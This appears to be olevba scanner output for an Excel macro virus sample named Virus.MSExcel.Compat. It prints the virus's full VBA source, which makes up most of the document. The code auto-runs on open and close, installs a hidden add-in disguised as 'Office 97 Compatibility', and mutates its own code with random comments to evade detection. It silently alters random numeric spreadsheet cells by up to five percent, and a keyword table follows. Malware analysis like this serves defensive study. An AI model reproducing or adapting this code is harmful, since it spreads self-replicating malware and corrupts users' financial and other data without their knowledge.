olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Compat-b8486a08a24afe5caa269660dbf9ee3b966842ac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DTADTJQMhVpRDerqDYLHdZrXnRzprmE.bas 
in file: Virus.MSExcel.Compat-b8486a08a24afe5caa269660dbf9ee3b966842ac - OLE stream: '_VBA_PROJECT_CUR/VBA/DTADTJQMhVpRDerqDYLHdZrXnRzprmE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
' Macro recorded 10/5/98 by Administrator
'
   Private h As String, i As String, j As String, k As String, l As String, z As Boolean 'q
      Private Sub Macro1() 'MiVNOzWPf
   Dim a As Integer, b As Integer, c As String, d As String, e As String, f As Variant, g As String
      Dim m As Boolean, n() As String, o As Integer, p As String, q As Integer, r As Integer 'c
   Application.ScreenUpdating = False
   Randomize 'AEGVfe
c = Macro7(8) & ".txt"
d = Macro7(Int(Rnd * 22 + 10))
      a = FreeFile() 'QCK
   Open l & c For Append As #a 'nigdwQk
   Print #a, "Sub Auto_Open"
   Print #a, "ThisWorkbook.Close saveChanges:=False" & Chr(13) & "End Sub" & Chr(13) & "Sub " & d
      Print #a, "Application.ScreenUpdating = False" & Chr(13) & "With ActiveWorkbook.Modules(1)" 'GAebCPwCWW
   Print #a, ".Visible = True" & Chr(13) & "Application.DisplayAlerts = False"
   Print #a, ".SaveAs filename:=""" & l & i & """, FileFormat:=xlText" 'levAJzrQL
Print #a, "Application.DisplayAlerts = True" & Chr(13) & ".Visible = xlVeryHidden" & Chr(13) & "End With"
   Print #a, "Application.ScreenUpdating = True" & Chr(13) & "ThisWorkbook.Close saveChanges:=True"
      Print #a, "Application.OnTime Now, ""Auto_Help""" & Chr(13) & "End Sub"
   Close
   ReDim n(Application.Workbooks.Count)
      Do 'UJJ
   m = False
   Workbooks.Add 'lrETVweK
   p = ActiveWorkbook.Name 'CH
   If InStr(1, p, ".") > 0 Then 'DMsJY
      p = Trim(Left(p, InStr(1, p, ".") - 1)) 'YGfuFdnnY
      'uUurHmKnvhWhlovB
      End If
      o = 0
      For Each f In Application.Workbooks 'BbxzeEcAGU
   e = f.Name
      If InStr(1, e, ".") > 0 Then
      e = Trim(Left(e, InStr(1, e, ".") - 1))
   End If 'QCsE
   n(o) = e
      o = o + 1 'swMPIzqgE
      'PwFOkPKWYEcQ
      Next 'xBrxH
      For q = 0 To Application.Workbooks.Count - 1 'IbVRGOB
      For r = 0 To Application.Workbooks.Count - 1 'Cf
   If q <> r Then
   If n(q) = n(r) And n(q) = p Then m = True 'OIsiJZfy
   End If 'nESVEZAz
   Next 'YrP
      Next 'jL
      If m = True Then 'PCMOLcJJm
'gqZecVyUnqt
For Each f In Application.Workbooks
   g = f.Name 'tOX
   If InStr(1, g, ".") > 0 Then
      g = Trim(Left(g, InStr(1, g, ".") - 1))
   End If 'FFJM
   If g = e And f.Modules.Count = 0 Then 'ulgTig
f.Close saveChanges:=False 'XGaDlXzbT
   'MEGRlxNnODArTFKxAa
   End If
      Next 'Tzf
      End If
   Loop While m = True
   Modules.Add
      b = ActiveSheet.Index
   With Modules(b) 'VBnmnvh
   .InsertFile filename:=l & c, Merge:=True 'jcmMYTZEJO
   .Name = d
   End With 'xLbQMoZ
   Application.DisplayAlerts = False
      With ActiveWorkbook 'VHFwSir
.SaveAs filename:=l & j, FileFormat:=xlNormal 'Gw
   End With
   Application.DisplayAlerts = True 'cWXiRwQqy
Kill l & c
      ActiveWindow.Visible = False
   Application.OnTime Now, l & j & "!" & d & "." & d
      Application.ScreenUpdating = True
   End Sub
   Private Sub Macro2() 'NhngongRg
Dim a As Integer, b As Integer, c As String, d As String, e As String, f As String
   'sLfLyNFcBqjrpcqscyIV
   Randomize 'WROnIbJ
   f = Macro7(8) & ".txt"
   d = "" 'zSXCNoI
   a = FreeFile() 'DeT
      'hkcWcJDUskUiuyWhJNtYLeeJmAMwxwHtPNW
      Open l & i For Input As #a
      b = FreeFile()
   Open l & f For Append As #b
      Print #b, Chr(39)
Print #b, Chr(39) & " Macro recorded " & Month(Now()) & "/" & Day(Now()) & "/" & Right(Year(Now()), 2) & " by " & Application.UserName
Print #b, Chr(39) 'zYpSwRvd
'mbQFp
Do Until EOF(a) 'GniEvfUL
   Line Input #a, c
   If InStr(1, c, Chr(39)) > 0 Then
   c = Trim(Left(c, InStr(1, c, Chr(39)) - 1)) 'kzIqk
   End If
   If Not Trim(c) = "Option Explicit" And Not Trim(c) = "" And Not Left(Trim(c), 1) = Chr(39) Then 'Fbd
e = "" 'g
      'UgR
      If Rnd > 0.5 Then e = " " & Chr(39) & Macro7(Int(10 * Rnd + 1))
   Print #b, d & Trim(c) & e
   End If
   If Rnd < 0.25 Then 'QTbJCYhurv
   If Rnd < 1 / 3 Then d = "" 'KRXJh
   ElseIf Rnd < 2 / 3 Then d = "   "
   Else: d = "      "
End If 'QNk
      If Rnd < 0.1 Then Print #b, d & Chr(39) & Macro7(Int(49 * Rnd + 1)) 'Ibhfu
      Loop
   Close
   'FNFfXQswZvQVAyLafPpjUQZ
   SetAttr (l & i), vbNormal 'zKR
      Kill l & i 'AOrHDJ
      Name l & f As l & i
'VsPhVfEMjueJgcOBuxCAgNSpIIAKSjVxNQRwVuiwCNfy
      z = False
      End Sub 'qYk
   Private Sub Macro3()
   If Date >= 36038 Then 'AMlG
   Dim a As Integer, b As Integer, c As Integer, d As Integer, e As Integer, f As Integer, g As Integer
Dim m As Integer, n As Integer, o As Integer, p As Integer, q() As Integer, r() As Integer
Dim s As Variant, t As Variant, u As Double, v As Double, w As Worksheet, x As Boolean, y As Boolean 'CPHzgmj
   If Not ActiveWorkbook.Saved And ActiveWorkbook.Worksheets.Count > 0 Then 'cQw
   Randomize 'Vccrwrsf
   b = 0 'd
   If TypeName(ActiveSheet) = "Worksheet" Then
   b = ActiveSheet.Index 'R
   End If
      c = ActiveWorkbook.Worksheets.Count - 1 'cIVo
   ReDim q(c)
      ReDim r(c) 'zviYkPCR
      g = 0 'SG
   For Each s In ActiveWorkbook.Worksheets
      q(g) = s.Index 'hmyIGA
      g = g + 1
   Next 'DNvBUjeMX
   For d = 0 To c
      x = False 'vbS
While x = False 'DOIF
   n = Int((1 + c) * Rnd)
   y = False
      For e = 0 To c 'rIsaTey
   If r(e) = q(n) Then y = True 'PrYCvOkTAA
   Next
      If y = False Then 'WztPPtA
   r(d) = q(n) 'IlDlo
      x = True
   End If
   Wend 'Db
      Next 'oA
      For d = 0 To c 'JwscvR
      Set w = ActiveWorkbook.Sheets(r(d)) 'vvTCJtvje
      If w.ProtectContents = False And w.UsedRange.Count > 1 And w.Index <> b Then 'IF
   m = Application.Calculation
   Application.Calculation = xlManual
      f = 1
For Each t In w.UsedRange 'hSSP
If Rnd() < 0.01 Then 'vPCSe
   If Not IsEmpty(t) And IsNumeric(t.Value) And t.HasFormula = False Then
   p = Len(t.Value)
   u = (10 * Rnd + 95) / 100 'qqoUKZOYKh
   t.Value = Left(t.Value * u, p)
   End If
   End If 'sVEINf
   f = f + 1 'kDvUNrA
   If f > 1000 Then Exit For
      Next 'UZPlavLQMi
   Application.Calculation = m
   Exit For 'p
      End If 'HcQytXYa
   Next 'AghcP
      'yQCOkqnlmBCKqDPqYGnVNNrRBfueJiuKscpwQkjzbjARd
      End If 'rVyruZeCs
   End If 'wasjLcx
   'AsfMVwYFsOqiUhkWTIdUIzaNThYgFiBqnXJ
   End Sub 'ZAz
   Private Sub Macro4()
   h = "Off97com.xla"
      i = "Vba_xl.txt" 'cChAOAbZ
      j = "Vba_xl.xls"
   k = Application.LibraryPath & Application.PathSeparator
   l = Application.Path & Application.PathSeparator
If Left(Application.OperatingSystem, 3) = "Mac" Then 'wubzgPm
      h = "Office 97 Compatibility" 'UTBsqAo
      i = "MS Excel Visual Basic Example"
      j = "MS Excel Temp File" 'nz
k = Application.LibraryPath
   l = Application.Path & Application.PathSeparator 'GkxEKvd
   End If 'dKrD
   End Sub
      Private Sub Macro5()
   Dim a As Integer, b As String, c As String, d As String, e As Variant 'egBlp
   Application.ScreenUpdating = False 'RZwRgtHGy
   Workbooks.Add 'IBpWevnD
      Modules.Add
      Application.DisplayAlerts = False 'qnSQ
   'bMIAnXdYncPzAoMCGGctfYss
   For Each e In ActiveWorkbook.Worksheets 'GI
   e.Delete
   Next 'pH
   Application.DisplayAlerts = True 'mZz
   'QFIlszdNwaWWVvkn
   a = ActiveSheet.Index 'vpcQpDaT
   c = CurDir() 'PZ
   d = Left(CurDir(), 1) 'saZQRAS
ActiveWorkbook.Modules(a).InsertFile filename:=l & i, Merge:=True 'f
   With ActiveWorkbook
   'JQPztmefPcUTPngBvu
   .Title = "Office 97 Compatibility"
   .Comments = "Allows Excel 5/7 users to share files with Excel 97 users."
      End With 'Q
      ChDrive k 'qUi
      ChDir k
   If h = "Off97com.xla" Then 'dP
   'JmQdtINakqXsmuMNjcIubbQlXcyLvzsKAeyyip
   Application.ExecuteExcel4Macro "VBA.MAKE.ADDIN(""Off97com.xla"")"
   Else
   Application.ExecuteExcel4Macro "VBA.MAKE.ADDIN(""Office 97 Compatibility"")" 'apySKUfuQ
   End If
   ActiveWorkbook.Close saveChanges:=False 'PCbtv
      'hDrkMYHzdlBHkkalvBrGoJqrDwyHuWqUcbjPHdrE
      AddIns.Add (k & h)
   AddIns("Office 97 Compatibility").Installed = True
      On Error GoTo e
      ChDrive d 'JgcPSzQm
   On Error GoTo 0
ChDir c 'Fbixav
'lEwizDZwc
Application.ScreenUpdating = True 'TBsntKe
      Exit Sub
e:  'vLU
   Resume Next
   End Sub
   Private Sub Macro6() 'PQWUPD
   If Not ActiveWorkbook.ProtectStructure Then 'QNQNW
   Dim a As Integer, b As String, c As String 'Aoc
      'CrAtPMFzUtXsSnXzTFULFLeBtdkowLXyPw
      If l = "" Or i = "" Then Macro4 'f
   c = Dir(l & i) 'DcFUpsD
   'iUSyZmeKPgVcyFGncZwFimhZIfZQwTO
   If c = i Then
   Application.ScreenUpdating = False
   If z Then Macro2
   Randomize
   a = Int(Rnd * Sqr((160 + 4 / 3) / (1 / 3)) + (2 ^ 3 + 22) / 3)
   b = ActiveWorkbook.ActiveSheet.Name
      Modules.Add before:=ActiveWorkbook.Sheets(1)
      Sheets(b).Select
Modules(1).InsertFile filename:=l & i, Merge:=True
With Modules(1) 'FHuir
      .Name = Macro7(a)
   .Visible = xlVeryHidden
   End With
   Application.ScreenUpdating = True 'aXlTCLybfn
      Else  'SYRULUwzga
      z = True 'CuhSNfKIXb
   End If
End If
   End Sub
Private Function Macro7(a As Integer) 'iVw
   Dim b As Integer, c As Integer, d As Integer, e As Double, f As String 'BiC
   Randomize 'I
   f = "" 'naMhWnKME
      b = a
   For c = 1 To b
      e = Rnd() 'VOfWiOc
      If e < 0.5 Then
      d = Int(Rnd * 26 + 65)
   Else
   'eLNrKMwXE
   d = Int(Rnd * 26 + 97) 'vHOMdbsCBx
End If 'iqsAJgDi
      f = f + Chr(d) 'kG
   Next
      Macro7 = f
      End Function
   Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
   If Val(Left(Application.Version, 1)) < 8 Then
      Dim a As Boolean, b As Boolean, c As Variant, d As Variant, e As String, f As String, g As String 'qWs
      Macro4 'lMjej
   z = False 'ruFP
   g = Dir(l & i)
      e = Dir(k & h)
   f = Dir(l & j) 'cu
   b = True
   If e = "" Then 'NhgJxRHa
b = False
   ElseIf FileLen(k & h) < 37000 Or FileLen(k & h) > 48000 Then
   For Each d In Application.AddIns 'jNrSf
      'IDAUuGXSerOgcOxJjGamDtwT
      If d.FullName = (k & h) Then d.Installed = False
   Next 'AKIWqstL
   SetAttr (k & h), vbNormal 'asMKlzmcf
   Kill (k & h)
   b = False
   End If 'LBeOLg
If ThisWorkbook.FileFormat <> xlAddIn Then
      If g = "" Then
      Macro1 'FzAoqZp
   ElseIf FileLen(l & i) < 9000 Then  'h
   'RkU
   SetAttr (l & i), vbNormal 'OxwtlHUobo
   Kill (l & i)
   Macro1 'WnlpvG
   Else  'HuFo
      'OavRevAeFYnBYxpziDLrLEPgZmoyUrenjeFQJrUqapyST
      Macro2
   'FrjVCrJlKRjZPhOBQeTnlNBckQHuumKLlyBIBOFKVAKaWMm
   If f <> "" Then 'ZNak
      SetAttr (l & j), vbNormal 'ogCSFIZRt
      'BpjZWHHrZwaksbzVqpDtfNNtHYunlirNq
      Kill (l & j)
   End If 'CVMa
   If e = "" Or b = False Then
   'hYZkiridIjzVSTgTszMBXCoZ
   Macro5
      e = Dir(k & h)
      If e <> "" Then b = True
   End If
   End If
      End If 'xdyXZ
      If b = True Then
   Application.OnSheetActivate = k & h & "!" & "Auto_Exit" 'IvEZzdC
   End If
   End If
      End Sub
   Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
   If Val(Left(Application.Version, 1)) < 8 Then 'qABzdydJy
   Dim a As Variant, b As Boolean
   If ThisWorkbook.FileFormat = xlAddIn And ThisWorkbook.Title = "Office 97 Compatibility" Then
   b = False 'UatRH
      For Each a In Application.AddIns 'butchZu
   If a.Title = "Office 97 Compatibility" Then b = True 'wkkOSmLnw
   Next 'RsIB
   If b = True And AddIns("Office 97 Compatibility").Installed = False Then
      AddIns("Office 97 Compatibility").Installed = True 'TV
      'vYGNsFOXBeHcGqEuaRlE
      End If 'zgZByOZx
      Else
      Macro3 'sRsFh
   End If 'z
   Else
   Macro3
      End If 'gS
   End Sub 'rTyNzN
   Sub Auto_Exit()
Attribute Auto_Exit.VB_ProcData.VB_Invoke_Func = " \n14"
      Dim a As Variant, b As Boolean 'DsZnOp
   If ActiveWorkbook.Modules.Count = 0 Then 'lkEIcJ
   Macro6
   Else
   b = False
   For Each a In ActiveWorkbook.Modules
   If a.Visible = xlVeryHidden Then 'ZzJx
      b = True 'kmGWKM
   Exit For 'ZeGHPoCnsX
      End If 'cAjBWFg
Next 'sqxF
If Not b Then
Macro6
   End If 'Bicakvks
   End If 'QNq
   'xhXePBigBiceUJhswBKLcHgdtjGjAtXZLhkPl
   End Sub
   'MacFoJWgpMIhPhpStrbxZtgZknbyViHmghhiLWHWgka
   Sub Auto_Help() 'rJnxn
Attribute Auto_Help.VB_ProcData.VB_Invoke_Func = " \n14"
Auto_Open 'ufU
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     39 BOUNDSHEET : Sheet Information - Visual Basic module, very hidden -  DTADTJQMhVpRDerqDYLHdZrXnRzprm
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ExecuteExcel4Macro  |May run an Excel 4 Macro (aka XLM/XLF) from  |
|          |                    |VBA                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

